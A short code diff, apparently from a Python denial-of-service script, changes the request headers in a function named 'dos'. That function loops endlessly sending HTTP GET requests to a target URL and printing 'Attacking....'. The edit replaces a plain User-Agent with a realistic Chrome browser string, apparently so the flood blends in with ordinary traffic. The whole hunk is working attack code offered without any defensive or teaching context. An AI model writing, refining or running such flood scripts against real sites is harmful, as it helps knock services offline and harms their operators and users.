@@ -7,7 +7,7 @@ import requests
 def dos(name, url):
     while True:
         try:
-            headers = {'User-Agent': 'apache2handler'}
+            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}
             r = requests.get(url, headers=headers)
             print(f"Thread Id: {name} : {r.status_code} Attacking....")
         except:  
